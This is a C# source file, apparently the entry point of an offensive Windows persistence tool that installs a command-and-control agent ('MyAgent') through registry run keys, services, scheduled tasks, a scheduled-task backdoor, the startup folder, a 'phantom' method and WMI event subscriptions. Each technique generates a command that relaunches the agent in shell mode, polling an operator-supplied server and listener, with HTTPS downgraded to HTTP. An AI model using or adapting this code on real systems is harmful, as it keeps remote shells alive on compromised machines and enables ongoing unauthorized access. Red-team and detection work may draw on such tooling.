using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Persist
{
    public class Persist
    {

        // variables used
        private const string RegistryDefaultExecutable = "MyAgent.exe";
        private static string persistTechnique = "";
        private static string command = "";
        private static string commandArg = "";
        private static string filePath = "";
        private static string theKey = "";
        private static string theVal = "";
        private static string theName = "";
        private static string shellServer = "";
        private static string shellListener = "";
        private static string shellAgentId = "";
        private static string method = "";
        private static string option = "";


        public static int Main(string[] args)
        {
            return ExecuteFromArgs(args);
        }

        public static int ExecuteFromArgs(string[] args)
        {

            try
            {
                Dictionary<string, string> argDict = lib.Utils.ParseArgs(args);

                if ((args.Length > 0 && argDict.Count == 0) || argDict.ContainsKey("h"))
                {
                    lib.Utils.PrintHelp();
                    return 0;
                }

                if (!argDict.ContainsKey("t") || !argDict.ContainsKey("m"))
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Must supply technique and method variables. See help (-h).");
                    return 1;
                }

                persistTechnique = argDict["t"];

                if (persistTechnique.Equals("reg", StringComparison.OrdinalIgnoreCase) &&
                    (argDict.ContainsKey("c") || argDict.ContainsKey("a")))
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Technique reg does not accept -c or -a. Registry data is generated for MyAgent shell mode.");
                    return 1;
                }
                if (persistTechnique.Equals("service", StringComparison.OrdinalIgnoreCase) &&
                    (argDict.ContainsKey("c") || argDict.ContainsKey("a")))
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Technique service does not accept -c or -a. Service ImagePath is generated for MyAgent shell mode.");
                    return 1;
                }
                if ((persistTechnique.Equals("schtask", StringComparison.OrdinalIgnoreCase) ||
                     persistTechnique.Equals("schtaskbackdoor", StringComparison.OrdinalIgnoreCase) ||
                     persistTechnique.Equals("startupfolder", StringComparison.OrdinalIgnoreCase)) &&
                    (argDict.ContainsKey("c") || argDict.ContainsKey("a")))
                {
                    Console.WriteLine("");
                    Console.WriteLine($"[-] ERROR: Technique {persistTechnique} does not accept -c or -a. Payload is generated for MyAgent shell mode.");
                    return 1;
                }
                if (persistTechnique.Equals("wmisubscription", StringComparison.OrdinalIgnoreCase) &&
                    (argDict.ContainsKey("c") || argDict.ContainsKey("a")))
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Technique wmisubscription does not accept -c or -a. Payload is generated for MyAgent shell mode.");
                    return 1;
                }
                if (argDict.ContainsKey("c")) command = argDict["c"];
                if (argDict.ContainsKey("a")) commandArg = argDict["a"];
                if (argDict.ContainsKey("f")) filePath = argDict["f"];
                if (argDict.ContainsKey("k")) theKey = argDict["k"];
                if (argDict.ContainsKey("v")) theVal = argDict["v"];
                if (argDict.ContainsKey("n")) theName = argDict["n"];
                if (argDict.ContainsKey("o")) option = argDict["o"];
                if (argDict.ContainsKey("s")) shellServer = argDict["s"];
                if (argDict.ContainsKey("l")) shellListener = argDict["l"];
                if (argDict.ContainsKey("i")) shellAgentId = argDict["i"];
                method = argDict["m"];
                
                if (persistTechnique.Equals("reg", StringComparison.OrdinalIgnoreCase))
                {
                    if ((method.Equals("add", StringComparison.OrdinalIgnoreCase) || method.Equals("check", StringComparison.OrdinalIgnoreCase)) &&
                        (string.IsNullOrWhiteSpace(shellServer) || string.IsNullOrWhiteSpace(shellListener)))
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[-] ERROR: Technique reg add/check requires -s <server_url> and -l <listener_id>.");
                        return 1;
                    }

                    command = BuildRegistryShellCommand(shellServer, shellListener, shellAgentId);
                    commandArg = "";
                }
                else if (persistTechnique.Equals("service", StringComparison.OrdinalIgnoreCase))
                {
                    if ((method.Equals("add", StringComparison.OrdinalIgnoreCase) || method.Equals("check", StringComparison.OrdinalIgnoreCase)) &&
                        (string.IsNullOrWhiteSpace(shellServer) || string.IsNullOrWhiteSpace(shellListener)))
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[-] ERROR: Technique service add/check requires -s <server_url> and -l <listener_id>.");
                        return 1;
                    }

                    command = BuildRegistryShellCommand(shellServer, shellListener, shellAgentId);
                    commandArg = "";
                }
                else if (persistTechnique.Equals("schtask", StringComparison.OrdinalIgnoreCase) ||
                         persistTechnique.Equals("schtaskbackdoor", StringComparison.OrdinalIgnoreCase) ||
                         persistTechnique.Equals("startupfolder", StringComparison.OrdinalIgnoreCase))
                {
                    if ((method.Equals("add", StringComparison.OrdinalIgnoreCase) || method.Equals("check", StringComparison.OrdinalIgnoreCase)) &&
                        (string.IsNullOrWhiteSpace(shellServer) || string.IsNullOrWhiteSpace(shellListener)))
                    {
                        Console.WriteLine("");
                        Console.WriteLine($"[-] ERROR: Technique {persistTechnique} add/check requires -s <server_url> and -l <listener_id>.");
                        return 1;
                    }

                    if (method.Equals("add", StringComparison.OrdinalIgnoreCase) || method.Equals("check", StringComparison.OrdinalIgnoreCase))
                    {
                        command = BuildRegistryShellCommand(shellServer, shellListener, shellAgentId);
                        commandArg = "";
                    }
                }
                else if (persistTechnique.Equals("phantom", StringComparison.OrdinalIgnoreCase))
                {
                    if ((method.Equals("add", StringComparison.OrdinalIgnoreCase) ||
                         method.Equals("check", StringComparison.OrdinalIgnoreCase) ||
                         method.Equals("host", StringComparison.OrdinalIgnoreCase)) &&
                        (string.IsNullOrWhiteSpace(shellServer) || string.IsNullOrWhiteSpace(shellListener)))
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[-] ERROR: Technique phantom add/check/host requires -s <server_url> and -l <listener_id> (same shell mode as other techniques).");
                        return 1;
                    }

                    if (method.Equals("add", StringComparison.OrdinalIgnoreCase) ||
                        method.Equals("check", StringComparison.OrdinalIgnoreCase) ||
                        method.Equals("host", StringComparison.OrdinalIgnoreCase))
                    {
                        command = BuildRegistryShellCommand(shellServer, shellListener, shellAgentId);
                        commandArg = "";
                    }
                }
                else if (persistTechnique.Equals("wmisubscription", StringComparison.OrdinalIgnoreCase))
                {
                    if ((method.Equals("add", StringComparison.OrdinalIgnoreCase) || method.Equals("check", StringComparison.OrdinalIgnoreCase)) &&
                        (string.IsNullOrWhiteSpace(shellServer) || string.IsNullOrWhiteSpace(shellListener)))
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[-] ERROR: Technique wmisubscription add/check requires -s <server_url> and -l <listener_id>.");
                        return 1;
                    }

                    if (method.Equals("add", StringComparison.OrdinalIgnoreCase) || method.Equals("check", StringComparison.OrdinalIgnoreCase))
                    {
                        command = BuildRegistryShellCommand(shellServer, shellListener, shellAgentId);
                        commandArg = "";
                    }
                }

                // initialize appropriate persistence object
                if (persistTechnique.ToLower().Equals("reg"))
                {
                    RegistryPersist registry = new RegistryPersist(persistTechnique, command, commandArg, theKey, theVal, theName, filePath, method, option);
                }
                else if (persistTechnique.ToLower().Equals("schtaskbackdoor"))
                {
                    SchTaskBackdoor schtaskBackdoor = new SchTaskBackdoor(persistTechnique, command, commandArg, theKey, theVal, theName, filePath, method, option);
                }
                else if (persistTechnique.ToLower().Equals("startupfolder"))
                {
                    StartupFolder startupFolder = new StartupFolder(persistTechnique, command, commandArg, theKey, theVal, theName, filePath, method, option);
                }
                else if (persistTechnique.ToLower().Equals("service"))
                {
                    Service service = new Service(persistTechnique, command, commandArg, theKey, theVal, theName, filePath, method, option);
                }
                else if (persistTechnique.ToLower().Equals("schtask"))
                {
                    SchTask schtask = new SchTask(persistTechnique, command, commandArg, theKey, theVal, theName, filePath, method, option);
                }
                else if (persistTechnique.ToLower().Equals("phantom"))
                {
                    PhantomPersist phantomPersist = new PhantomPersist(persistTechnique, command, commandArg, theKey, theVal, theName, filePath, method, option);
                }
                else if (persistTechnique.ToLower().Equals("wmisubscription"))
                {
                    WmiSubscription wmiSubscription = new WmiSubscription(persistTechnique, command, commandArg, theKey, theVal, theName, filePath, method, option);
                }
                else
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] Invalid technique given. See help (-h).");
                    return 1;
                }
            }
            catch (NullReferenceException)
            {
                return 1;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] ERROR: Unexpected persistence error: {ex.Message}");
                return 1;
            }

            return 0;
        } // end main

        private static string BuildRegistryShellCommand(string server, string listener, string agentId)
        {
            string executablePath = Environment.ProcessPath;
            if (string.IsNullOrWhiteSpace(executablePath))
            {
                executablePath = RegistryDefaultExecutable;
            }
            string escapedPath = executablePath.Replace("\"", "\"\"");
            string baseCommand = $"\"{escapedPath}\" --shell-only --shell-poll 2 --shell-timeout 120";
            if (!string.IsNullOrWhiteSpace(agentId))
            {
                string safeAgentId = agentId.Replace("\"", "\\\"");
                baseCommand += $" --agent-id \"{safeAgentId}\"";
            }

            if (string.IsNullOrWhiteSpace(server) || string.IsNullOrWhiteSpace(listener))
            {
                return baseCommand;
            }

            string httpServer = ForceHttpServerUrl(server);
            string safeServer = httpServer.Replace("\"", "\\\"");
            string safeListener = listener.Replace("\"", "\\\"");
            return $"{baseCommand} --server \"{safeServer}\" --listener \"{safeListener}\"";
        }

        private static string ForceHttpServerUrl(string value)
        {
            if (string.IsNullOrWhiteSpace(value))
            {
                return value;
            }

            return Regex.Replace(value.Trim(), @"^https://", "http://", RegexOptions.IgnoreCase);
        }

    } // end class

} // end namespace